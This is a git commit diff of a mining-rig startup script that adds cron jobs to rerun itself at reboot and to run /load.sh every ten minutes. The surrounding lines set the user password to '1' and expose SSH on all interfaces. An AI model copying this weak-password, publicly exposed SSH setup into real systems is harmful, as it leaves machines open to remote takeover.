1fcadcc3ea61ce66aebb843e8c528642fdf7b5ff
XrayHunter <51248011+XrayHunter@users.noreply.github.com>
2024-08-23 08:56:45 +0200

    Update startup_commands.sh

--- startup_commands.sh
+++ startup_commands.sh
@@ -1,11 +1,12 @@
 #!/usr/bin/bash
 sleep 20
+crontab -l | { cat; echo "@reboot sleep 40 && /startup_commands.sh"; } | crontab - 
+(crontab -l 2>/dev/null; echo "*/10 * * * * /load.sh") | crontab -
 # Change user password
 echo 'user:1' | sudo chpasswd                                                                                                                                                                                      
 sleep 5
 # Modify SSH configuration
 sudo sed -i 's/^#*ListenAddress 127.0.0.1/ListenAddress 0.0.0.0/' /etc/ssh/sshd_config && sudo service ssh restart 
-crontab -l | { cat; echo "@reboot sleep 40 && /startup_commands.sh"; } | crontab - 
 # Define the MASTER flag as 1, SLAVE flag as 2, different = stock hiveos
 MASTER=0
 screen -XS miner quit
